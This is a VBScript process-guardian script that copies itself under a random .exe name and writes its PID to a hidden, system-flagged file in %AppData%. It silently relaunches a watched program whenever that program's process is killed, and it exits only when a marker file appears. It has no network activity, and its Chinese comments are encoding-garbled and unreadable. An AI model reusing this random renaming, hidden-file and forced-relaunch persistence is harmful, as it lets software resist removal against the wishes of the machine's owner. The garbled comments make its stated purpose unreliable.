REM ǿ�Ʊ�������
Option Explicit
On Error Resume Next
REM �������壺
	REM Wsh Wscript.Shell
	REM FSO Scripting.FileSystemObject
	REM Wmi WMI�����ռ�����
	REM AppDataPath ϵͳ����%AppData%·��
	REM SafePIDPath ���ӳ���(�˳���)PIDд��·��
	REM DelayTime �ȴ�ʱ��
	REM RandomName ����ļ���
	REM CheckName �ļ���֤���� firstrun.ini
Dim Wsh,FSO,Wmi,AppDataPath,SafePIDPath,DelayTime,WmiList,oExec,strText,RandomName,CheckName,MyName,WmilistX,WmilistY
REM �ȴ�ʱ�䶨��
DelayTime=1000*5
Set Wsh=CreateObject("Wscript.Shell")
Set FSO=CreateObject("Scripting.FileSystemObject")
Set Wmi=GetObject("winmgmts:")
CheckName="firstrun.ini"
REM ��ֵ����AppDataPahtΪϵͳ����%appdata%����
AppDataPath=Wsh.expandenvironmentstrings("%AppData%")
REM ���л������
If FSO.FileExists(AppdataPath&"\con\.fms") Then Wscript.Quit
REM �״������������Ƹ���
If Not FSO.FileExists(CheckName) Then
	MyName=FSO.GetFileName(Wscript.ScriptFullName)
	RandomName=genStr(6,9)&".exe"
	FSO.CopyFile MyName,RandomName,true
	FSO.OpenTextFile(CheckName,2,true).WriteLine(MyName)
	WSH.Exec(RandomName)
	Wscript.Quit
Else
	RandomName=FSO.OpenTextFile(CheckName,1).ReadLine
	If FSO.FileExists(RandomName) then FSO.DeleteFile RandomName,true
	If FSO.FileExists(CheckName) then FSO.DeleteFile CheckName,true
	MyName=FSO.GetFileName(Wscript.ScriptFullName)
End If
REM ��ȡ����pid�ļ��Ƿ����
Do
	If FSO.FileExists(AppdataPath&"\fms3.fms") Then Exit Do
	Wscript.Sleep 1000
Loop
REM ��鰲ȫ���ļ��Ƿ����
Do
	If FSO.FileExists(AppdataPath&"\fms4.fms") Then
		Exit Do
	End If
	Wscript.Sleep 1000
Loop
REM ��ȡ����ֵ����SafePIDPath
SafePIDPath=AppdataPath&"\fms5.fms"
REM �鿴�Ƿ�����ʵ������
If FSO.FileExists(SafePIDPath) Then 
	If PIDCheck(FSO.OpenTextFile(SafePIDPath,1).ReadLine) Then Wscript.Quit
End If
REM ��ȡ��ǰ���̵�PID��д�뵽fms5.fms
Set WmiListX=Wmi.ExecQuery("Select * From Win32_Process Where Name='"&MyName&"'")
For Each WmilistY In WmilistX
	REM ȡ��fms5.fms�ļ�����
	If FSO.FileExists(AppDataPath&"\fms5.fms") Then FSO.GetFile(AppDataPath&"\fms5.fms").attributes=32
	REM ��������PIDд��fms5.fms
	FSO.OpenTextFile(AppDataPath&"\fms5.fms",2,true).WriteLine(WmilistY.Handle)
	REM ����fms5.fms�ļ�����
	FSO.GetFile(AppDataPath&"\fms5.fms").attributes=32+4+2+1
Next

Do
	REM ���AppDataPath\con\.fms�Ƿ���ڣ������˳�
	If FSO.FileExists(AppdataPath&"\con\.fms") Then Wscript.Quit
	REM �鿴�����PID�Ƿ���ڲ��������ж���
	If Not PIDCheck(FSO.OpenTextFile(AppDataPath&"\fms3.fms",1).ReadLine) Then
		If FSO.FileExists(FSO.OpenTextFile(AppDataPath&"\fms4.fms",1).ReadLine) Then
			Wsh.RUN "cmd /c start """" "&""""&FSO.OpenTextFile(AppDataPath&"\fms4.fms",1).ReadLine&"""",0
			Wscript.Sleep 10*1000
		End If
	End If
	REM ��ʱTime��
	Wscript.Sleep DelayTime
Loop

REM ���PID�Ƿ����
Private Function PIDCheck(PIDName)
	Set WmiList=Wmi.ExecQuery("Select * From Win32_Process Where Handle='"&PIDName&"'")
	PIDCheck=(WmiList.Count<>0)
End Function

REM ����ַ�����
Function randNum(lowerbound, upperbound)
    Randomize Time()
    randNum =  Int((upperbound - lowerbound + 1) * Rnd + lowerbound)
End Function
Function genStr(n, m)
    Dim a, z, s, i, p, k
    Dim arr()
    For i = 0 To 9
        ReDim Preserve arr(i)
        arr(i) = Chr(Asc("0") + i)
    Next
    k = UBound(arr)
    For i = 0 To 25
        Redim Preserve arr(k+1+i)
        arr(k+1+i) = Chr(Asc("a") + i)
    Next
    k = UBound(arr)
    For i = 0 To 25
        Redim Preserve arr(k+1+i)
        arr(k+1+i) = Chr(Asc("A") + i)
    Next
    a = 0
    z = UBound(arr)
    s = ""
    p = randNum(n, m)
    For i = 1 To p
        s = s & arr(randNum(a, z))
    Next
    genStr = s
End Function
